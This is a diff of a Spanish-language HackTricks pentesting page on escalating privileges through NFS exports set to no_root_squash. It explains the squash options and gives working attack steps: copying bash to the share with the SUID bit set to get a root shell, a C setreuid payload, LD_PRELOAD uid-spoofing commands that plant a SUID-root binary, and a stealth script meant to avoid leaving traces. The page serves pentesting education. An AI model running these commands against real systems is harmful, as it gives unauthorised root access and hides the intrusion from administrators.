@@ -1,18 +1,29 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-Lee el _ **/etc/exports** _ archivo, si encuentras algún directorio que esté configurado como **no_root_squash**, entonces puedes **acceder** a él **como cliente** y **escribir dentro** de ese directorio **como** si fueras el **root** local de la máquina.
+# Información Básica sobre Squashing
 
-**no_root_squash**: Esta opción básicamente le da autoridad al usuario root en el cliente para acceder a archivos en el servidor NFS como root. Y esto puede llevar a serias implicaciones de seguridad.
+NFS generalmente (especialmente en Linux) confía en el `uid` y `gid` indicados por el cliente que se conecta para acceder a los archivos (si no se utiliza kerberos). Sin embargo, hay algunas configuraciones que se pueden establecer en el servidor para **cambiar este comportamiento**:
 
-**no_all_squash:** Esto es similar a la opción **no_root_squash** pero se aplica a **usuarios no root**. Imagina que tienes un shell como el usuario nobody; revisaste el archivo /etc/exports; la opción no_all_squash está presente; revisa el archivo /etc/passwd; emula un usuario no root; crea un archivo suid como ese usuario (montando usando nfs). Ejecuta el suid como el usuario nobody y conviértete en un usuario diferente.
+- **`all_squash`**: Aplana todos los accesos mapeando a cada usuario y grupo a **`nobody`** (65534 sin signo / -2 con signo). Por lo tanto, todos son `nobody` y no se utilizan usuarios.
+- **`root_squash`/`no_all_squash`**: Este es el valor predeterminado en Linux y **solo aplana el acceso con uid 0 (root)**. Por lo tanto, cualquier `UID` y `GID` son confiables, pero `0` se aplana a `nobody` (por lo que no es posible la suplantación de root).
+- **`no_root_squash`**: Esta configuración, si está habilitada, ni siquiera aplana al usuario root. Esto significa que si montas un directorio con esta configuración, puedes acceder a él como root.
 
-# Escalamiento de Privilegios
+En el archivo **/etc/exports**, si encuentras algún directorio que esté configurado como **no_root_squash**, entonces puedes **acceder** a él desde **como cliente** y **escribir dentro** de ese directorio **como** si fueras el **root** local de la máquina.
+
+Para más información sobre **NFS**, consulta:
+
+{{#ref}}
+/network-services-pentesting/nfs-service-pentesting.md
+{{#endref}}
+
+# Escalación de Privilegios
 
 ## Explotación Remota
 
-Si has encontrado esta vulnerabilidad, puedes explotarla:
-
-- **Montando ese directorio** en una máquina cliente, y **como root copiando** dentro de la carpeta montada el **/bin/bash** binario y dándole derechos **SUID**, y **ejecutando desde la máquina víctima** ese binario bash.
+Opción 1 usando bash:
+- **Montar ese directorio** en una máquina cliente, y **como root copiar** dentro de la carpeta montada el binario **/bin/bash** y darle derechos **SUID**, y **ejecutar desde la máquina víctima** ese binario bash.
+- Ten en cuenta que para ser root dentro del recurso compartido NFS, **`no_root_squash`** debe estar configurado en el servidor.
+- Sin embargo, si no está habilitado, podrías escalar a otro usuario copiando el binario al recurso compartido NFS y dándole el permiso SUID como el usuario al que deseas escalar.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -25,7 +36,9 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-- **Montando ese directorio** en una máquina cliente, y **como root copiando** dentro de la carpeta montada nuestro payload compilado que abusará del permiso SUID, dándole derechos **SUID**, y **ejecutando desde la máquina víctima** ese binario (puedes encontrar aquí algunos [payloads C SUID](payloads-to-execute.md#c)).
+Opción 2 usando código compilado en C:
+- **Montando ese directorio** en una máquina cliente, y **como root copiando** dentro de la carpeta montada nuestra carga útil compilada que abusará del permiso SUID, dándole derechos de **SUID**, y **ejecutando desde la máquina víctima** ese binario (puedes encontrar aquí algunos [C SUID payloads](payloads-to-execute.md#c)).
+- Las mismas restricciones que antes.
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -43,8 +56,8 @@ cd <SHAREDD_FOLDER>
 
 > [!NOTE]
 > Tenga en cuenta que si puede crear un **túnel desde su máquina a la máquina víctima, aún puede usar la versión remota para explotar esta escalada de privilegios tunelizando los puertos requeridos**.\
-> El siguiente truco es en caso de que el archivo `/etc/exports` **indique una IP**. En este caso, **no podrá usar** en ningún caso el **exploit remoto** y necesitará **abusar de este truco**.\
-> Otro requisito necesario para que el exploit funcione es que **la exportación dentro de `/etc/export`** **debe estar usando la bandera `insecure`**.\
+> El siguiente truco es en caso de que el archivo `/etc/exports` **indique una IP**. En este caso **no podrá usar** en ningún caso la **explotación remota** y necesitará **abusar de este truco**.\
+> Otro requisito necesario para que la explotación funcione es que **la exportación dentro de `/etc/export`** **debe estar usando la bandera `insecure`**.\
 > --_No estoy seguro de que si `/etc/export` está indicando una dirección IP, este truco funcionará_--
 
 ## Basic Information
@@ -62,34 +75,29 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 ### Realizando el Explotación
 
-La explotación implica crear un programa C simple (`pwn.c`) que eleva privilegios a root y luego ejecuta un shell. El programa se compila y el binario resultante (`a.out`) se coloca en el recurso compartido con suid root, utilizando `ld_nfs.so` para falsificar el uid en las llamadas RPC:
+La explotación implica crear un programa simple en C (`pwn.c`) que eleva los privilegios a root y luego ejecuta un shell. El programa se compila y el binario resultante (`a.out`) se coloca en el recurso compartido con suid root, utilizando `ld_nfs.so` para falsificar el uid en las llamadas RPC:
 
 1. **Compilar el código de explotación:**
-
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
-
-2. **Colocar la explotación en el recurso compartido y modificar sus permisos falsificando el uid:**
-
+2. **Coloca el exploit en el recurso compartido y modifica sus permisos falsificando el uid:**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-
-3. **Ejecutar la explotación para obtener privilegios de root:**
+3. **Ejecuta el exploit para obtener privilegios de root:**
 ```bash
 /mnt/share/a.out
 #root
 ```
+## Bonus: NFShell para Acceso a Archivos Sigiloso
 
-## Bonificación: NFShell para Acceso a Archivos Sigiloso
-
-Una vez que se obtiene acceso root, para interactuar con el recurso compartido NFS sin cambiar la propiedad (para evitar dejar rastros), se utiliza un script de Python (nfsh.py). Este script ajusta el uid para que coincida con el del archivo que se está accediendo, permitiendo la interacción con archivos en el recurso compartido sin problemas de permisos:
+Una vez que se obtiene acceso root, para interactuar con el recurso compartido NFS sin cambiar la propiedad (para evitar dejar rastros), se utiliza un script de Python (nfsh.py). Este script ajusta el uid para que coincida con el del archivo que se está accediendo, lo que permite interactuar con archivos en el recurso compartido sin problemas de permisos:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
